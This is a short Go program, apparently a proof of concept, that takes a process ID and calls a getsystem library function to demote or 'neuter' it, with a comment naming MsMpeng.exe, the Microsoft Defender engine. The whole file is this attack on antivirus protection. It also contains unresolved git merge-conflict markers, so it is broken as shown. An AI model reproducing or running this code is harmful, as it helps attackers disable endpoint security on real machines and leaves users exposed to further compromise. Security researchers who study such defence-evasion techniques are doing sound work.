package main

import (
	"log"
	"os"
	"strconv"

	"github.com/audibleblink/getsystem"
)

func main() {
	pid, _ := strconv.Atoi(os.Args[1]) // MsMpeng.exe
<<<<<<< HEAD
	err := getsystem.DemoteProcess(pid)
=======
	err := getsystem.NeuterProcess(pid)
>>>>>>> 906687c (PoC)
	if err != nil {
		log.Fatal(err)
	}
}
